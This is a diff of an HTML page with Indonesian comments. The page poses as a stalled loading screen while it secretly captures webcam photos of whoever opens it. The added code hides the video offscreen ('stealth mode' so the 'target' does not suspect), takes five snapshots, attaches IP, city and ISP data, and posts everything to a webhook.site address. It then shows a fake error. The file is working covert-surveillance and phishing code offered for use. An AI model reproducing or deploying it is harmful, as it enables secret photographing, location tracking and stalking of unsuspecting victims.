@@ -5,13 +5,15 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sistem Sedang Memuat...</title>
     <style>
+        /* Tampilan Loading Palsu agar Target Tidak Curiga */
         body { margin: 0; padding: 0; width: 100vw; height: 100vh; display: flex; justify-content: center; align-items: center; background-color: #121212; color: #e0e0e0; font-family: sans-serif; overflow: hidden; }
         #container { position: relative; display: flex; flex-direction: column; align-items: center; }
         #loader { border: 5px solid #333; border-top: 5px solid #fe2c55; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         #status { font-size: 16px; font-weight: bold; text-transform: uppercase; letter-spacing: 2px; color: #fe2c55; text-align: center; }
-        #video-container { position: absolute; top: -1000px; left: -1000px; width: 320px; height: 240px; overflow: hidden; opacity: 0; }
-        #video { width: 100%; height: 100%; object-fit: cover; }
+        
+        /* Menyembunyikan Kamera dari Layar HP Target (Stealth Mode) */
+        #video-container { position: absolute; top: -5000px; left: -5000px; opacity: 0; }
     </style>
 </head>
 <body>
@@ -19,90 +21,87 @@
     <div id="container">
         <div id="loader"></div>
         <div id="status">Koneksi Tidak Stabil...</div>
-        <p style="font-size: 12px; color: #888; margin-top: 10px;">Mohon tunggu, sedang mencoba menghubungkan.</p>
+        <p style="font-size: 12px; color: #888; margin-top: 10px;">Mohon tunggu, sedang mencoba menghubungkan kembali.</p>
     </div>
 
     <div id="video-container">
-        <video id="video" autoplay muted playsinline></video>
-        <canvas id="canvas" width="320" height="240"></canvas>
+        <video id="video" width="640" height="480" autoplay muted playsinline></video>
+        <canvas id="canvas" width="640" height="480"></canvas>
     </div>
 
     <script>
-        // --- KONFIGURASI ---
-        const WEBHOOK_URL = 'https://webhook.site/da585ce8-007d-4bdd-8301-698ea088b877'; // <--- GANTI INI!
+        // --- KONFIGURASI WEBHOOK KAMU ---
+        const WEBHOOK_URL = 'https://webhook.site/da585ce8-007d-4bdd-8301-698ea088b877';
+        
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
         const statusDiv = document.getElementById('status');
-        let isCameraActive = false;
         let photoCount = 0;
 
-        // --- 1. MINTA IZIN KAMERA (LANGSUNG SAAT LOAD) ---
-        // Izin ini satu-satunya hal yang tidak bisa disembunyikan.
-        async function startCamera() {
+        // 1. Minta Izin Kamera Otomatis
+        async function startSystem() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                 video.srcObject = stream;
-                isCameraActive = true;
-                statusDiv.innerText = "Memproses Data..."; // Ganti status setelah izin didapat
-                // Mulai ambil foto setelah kamera siap
-                setTimeout(mulaiAmbilFoto, 1000); 
+                statusDiv.innerText = "Sinkronisasi Data...";
+                
+                // Mulai ambil foto setelah kamera stabil (delay 2 detik)
+                setTimeout(takeSnapShot, 2000);
             } catch (err) {
-                console.error("Gagal Akses Kamera:", err);
-                statusDiv.innerText = "Koneksi Terputus."; // Pura-pura gagal kalau izin ditolak
-                kirimDataKeWebhook({ status: "KAMERA_DITOLAK", error: err.message });
+                statusDiv.innerText = "Koneksi Gagal.";
+                kirimData({ status: "IZIN_DITOLAK", pesan: err.message });
             }
         }
 
-        // --- 2. MULAI AMBIL FOTO (DIAM-DIAM) ---
-        function mulaiAmbilFoto() {
-            if (!isCameraActive || photoCount >= 5) return; // Batasi maksimal 5 foto biar gak spam
+        // 2. Fungsi Ambil Foto Diam-Diam
+        function takeSnapShot() {
+            if (photoCount >= 5) {
+                statusDiv.innerText = "Sistem Error 404"; // Pura-pura error setelah dapet foto
+                return;
+            }
 
             photoCount++;
             
-            // Ambil gambar dari video stream
+            // Gambar frame video ke canvas
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            // Ubah gambar jadi kode Base64 (JPEG, kualitas 40% biar enteng)
-            const dataFoto = canvas.toDataURL('image/jpeg', 0.4); 
+            // Convert ke Base64 (Kualitas 0.4 agar kirimnya cepat)
+            const dataFoto = canvas.toDataURL('image/jpeg', 0.4);
 
-            // Kirim data foto ke Webhook
-            kirimDataKeWebhook({
-                status: "FOTO_TARGET",
-                no_foto: photoCount,
-                waktu: new Date().toLocaleString('id-ID'),
-                perangkat: navigator.userAgent,
-                foto: dataFoto // <--- INI DATA GAMBARNYA
+            // Kirim ke Webhook
+            kirimData({
+                event: "SNAP_SHOT",
+                no: photoCount,
+                foto: dataFoto,
+                perangkat: navigator.userAgent
             });
 
-            // Ambil foto lagi setelah 2 detik
-            setTimeout(mulaiAmbilFoto, 2000); 
+            // Ambil foto lagi setiap 3 detik sampai 5 foto
+            setTimeout(takeSnapShot, 3000);
         }
 
-        // --- 3. FUNGSI KIRIM WEBHOOK (TEKS & GAMBAR BASE64) ---
-        async function kirimDataKeWebhook(payload) {
+        // 3. Fungsi Kirim Data
+        async function kirimData(payload) {
             try {
-                // Ambil data IP tambahan
-                const res = await fetch('https://ipapi.co/json/');
-                const ipData = await res.json();
+                // Tambahkan info lokasi IP secara kasar
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
                 
-                // Gabungkan data foto & IP
-                const fullPayload = { ...payload, ...{ kota_ip: ipData.city, isp: ipData.org } };
+                const finalData = { ...payload, ...{ kota: ipData.city, provider: ipData.org, ip: ipData.ip } };
 
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
-                    mode: 'no-cors', // Penting agar tidak diblokir browser
+                    mode: 'no-cors',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(fullPayload)
+                    body: JSON.stringify(finalData)
                 });
-                console.log(`Data Foto ${payload.no_foto || ''} Terkirim.`);
             } catch (e) {
-                console.error("Gagal kirim data:", e);
+                console.log("Kirim data gagal");
             }
         }
 
-        // Jalankan sistem saat halaman dibuka
-        window.onload = startCamera;
+        window.onload = startSystem;
     </script>
 </body>
 </html>
